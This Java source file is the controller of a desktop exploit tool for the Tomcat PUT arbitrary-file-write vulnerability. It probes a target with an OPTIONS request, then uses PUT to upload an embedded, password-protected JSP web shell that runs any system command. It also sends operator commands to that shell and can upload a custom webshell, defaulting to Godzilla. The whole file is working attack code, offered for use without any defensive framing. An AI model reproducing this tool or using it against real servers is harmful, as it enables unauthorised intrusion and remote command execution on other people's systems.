package cn.xiaokp.Tomcat_PUT_EXP;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import lib.src.main.java.com.github.kevinsawicki.http.HttpRequest;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.Locale;

public class Controller {

    @FXML
    private TextField targetAddress;

    @FXML
    private Button checkBut;

    @FXML
    private TextArea logTextArea;

    @FXML
    private TextField command;

    @FXML
    private Button execBut;

    @FXML
    private TextArea commandEcho;

    @FXML
    private TextField fileName;

    @FXML
    private Button uploadBtn;

    @FXML
    private TextArea shell;

    private boolean isCheck=false;//是否进行了漏洞检测


    //漏洞检测，检测是否存在Tomcat PUT漏洞
    @FXML
    void check(ActionEvent event) {
        //获取检测目标站点
        String url = targetAddress.getText();
        //检测是否输入检测目标地址是否为空
        if (targetIsEmpty(url)){
            Alert warn = new Alert(Alert.AlertType.INFORMATION);
            warn.setTitle("提示");
            warn.setHeaderText("目标地址为空，请输入！");
            warn.showAndWait();
            return;
        }
        if (checkPut(url)){
            logTextArea.setText(url+"存在Tomcat PUT方法任意文件写入漏洞！");
            isCheck=true;

        }else{
            logTextArea.setText(url+"不存在Tomcat PUT方法任意文件写入漏洞！");
            System.out.println("no put");
            isCheck=true;
        }

    }


    /**
     *判断Tomcat是否存在PUT任意文件写入漏洞
     * @param url 目标地址
     */
    public boolean checkPut(String url){
        String[] method;//定义服务端允许的方法集合
        //命令执行shell
        String shellText = "<%@ page language=\"java\" %>\n" +
                "<%@ page import=\"java.io.*, java.util.*, java.net.*, java.lang.*\" %>\n" +
                "<%\n" +
                "    String charsetName = java.nio.charset.Charset.defaultCharset().name();\n" +
                "    response.setContentType(\"text/html; charset=\" + charsetName);\n" +
                "%>"+
                "<%\n" +
                "String password = request.getParameter(\"password\"); // 获取密码参数\n" +
                "if (password != null && password.equals(\"xiaokp.456.789\")) {\n" +
                "    String command = request.getParameter(\"command\"); // 获取命令参数\n" +
                "    if (command != null) {\n" +
                "        try {\n" +
                "            // 执行命令\n" +
                "            Process process = Runtime.getRuntime().exec(command);\n" +
                "            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), charsetName));\n" +
                "            String line;\n" +
                "            StringBuilder output = new StringBuilder();\n" +
                "            while ((line = reader.readLine()) != null) {\n" +
                "                output.append(line + \"\\n\");\n" +
                "            }\n" +
                "            // 输出命令执行结果\n" +
                "            out.println(output.toString());\n" +
                "        } catch (Exception e) {\n" +
                "            out.println(\"Error executing command: \" + e.getMessage());\n" +
                "        }\n" +
                "    }\n" +
                "} else {\n" +
                "    out.println(\"Invalid password.\");\n" +
                "}\n" +
                "%>\n";
        //OPTIONS请求
        HttpRequest request = HttpRequest.options(url+"/index.txt");
        System.out.println(request.code());
        //当服务端支持OPTIOS请求时,判断服务端是否支持PUT方法
        if (request.code()==200){
            method = request.header("Allow").replaceAll(" ","").split(",");
            System.out.println(method);
            for (String s : method) {
                if (s.equals("PUT")) {
                    //测试当服务端不支持OPTIOS方法时，是否支持PUT方法写入文件
                    HttpRequest putFile = HttpRequest.put(url+"/exec.jsp/").send(shellText);
                    HttpRequest getFile =HttpRequest.get(url+"/exec.jsp");
                    System.out.println(putFile.code());
                    System.out.println(getFile.code());
                   return putFile.code() == 201|| putFile.code()==204&&getFile.body().toString().trim().equals("Invalid password.");
                }
            }
        }
        return false;
    }

    /**
     *判断目标地址是否为空
     * @param url 目标地址
     */
    public boolean targetIsEmpty(String url){
        return url.isEmpty();
    }

    /**
     * 判断是否输入命令
     * @param command
     * @return
     */
    public boolean commandIsEmpty(String command){return command.isEmpty();}
    @FXML
    void exec(ActionEvent event) throws UnsupportedEncodingException, InterruptedException {
        //获取目标站点
       String url = targetAddress.getText();
       //要执行的命令
        String cmd = URLEncoder.encode(command.getText(),"UTF-8");
       //命令执行shell

        //检测是否输入命令
        if (targetIsEmpty(cmd)){
            Alert warn = new Alert(Alert.AlertType.INFORMATION);
            warn.setTitle("提示");
            warn.setHeaderText("未输入命令，请输入！");
            warn.showAndWait();
            return;
        }
        if (isCheck==false){
            Alert warn = new Alert(Alert.AlertType.INFORMATION);
            warn.setTitle("提示");
            warn.setHeaderText("请先检测漏洞是否存在，再执行命令！");
            warn.showAndWait();
            return;
        }
        HttpRequest execCommad = HttpRequest.get(url + "/exec.jsp?password=xiaokp.456.789&command=" + cmd);
        System.out.println(execCommad.code());
        System.out.println(execCommad);
        commandEcho.setText(execCommad.body().trim().replace(" ", ""));

    }

    @FXML
    void upload(ActionEvent event) {
        //获取目标站点地址
        String url = targetAddress.getText();
        //定义上传shell文本内容
        String shellTest;
        //定义上传文件名
        String uploadFileName;

        //判断是否自定义shell，默认shell为哥斯拉
        if (shell.getText().isEmpty()){
            shellTest = shell.getPromptText();
        }else{
            shellTest = shell.getText();
        }
        //判断是否自定义上传文件名，默认为shell.jsp
        if (fileName.getText().isEmpty()){
            uploadFileName="shell.jsp";
        }else{
            uploadFileName=fileName.getText();
        }
        if (isCheck==false){
            Alert warn = new Alert(Alert.AlertType.INFORMATION);
            warn.setTitle("提示");
            warn.setHeaderText("请先检测漏洞是否存在，再上传webshell！");
            warn.showAndWait();
            return;
        }
        //上传webshell
        HttpRequest uploadRequese = HttpRequest.put(url+"/"+uploadFileName+"/").send(shellTest);

        //判断是否上传成功
        if (HttpRequest.get(url+"/"+uploadFileName).code()==200 && uploadRequese.code()==201||uploadRequese.code()==204){
            Alert warn = new Alert(Alert.AlertType.INFORMATION);
            warn.setTitle("提示");
            warn.setHeaderText("webshell上传成功");
            warn.showAndWait();
            return;
        }else{
            Alert warn = new Alert(Alert.AlertType.INFORMATION);
            warn.setTitle("提示");
            warn.setHeaderText("webshell上传失败");
            warn.showAndWait();
            return;
        }
    }

}
